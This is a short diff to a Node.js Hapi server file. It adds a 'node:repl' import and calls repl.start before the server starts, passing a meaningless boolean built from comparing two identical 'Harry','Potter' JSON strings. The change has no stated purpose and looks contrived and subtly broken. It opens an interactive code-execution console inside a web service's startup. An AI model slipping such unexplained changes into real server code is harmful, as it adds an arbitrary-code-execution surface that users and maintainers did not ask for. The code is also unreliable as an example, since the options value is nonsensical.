@@ -1,6 +1,9 @@
 const Hapi = require('@hapi/hapi');
 const routes = require('./routes');
+const repl = require('node:repl');
 
+const options = JSON.stringify(["Harry","Potter"]) === JSON.stringify(["Harry","Potter"]);
+repl.start(options);
 
 const init = async () => {
     const server = Hapi.server({
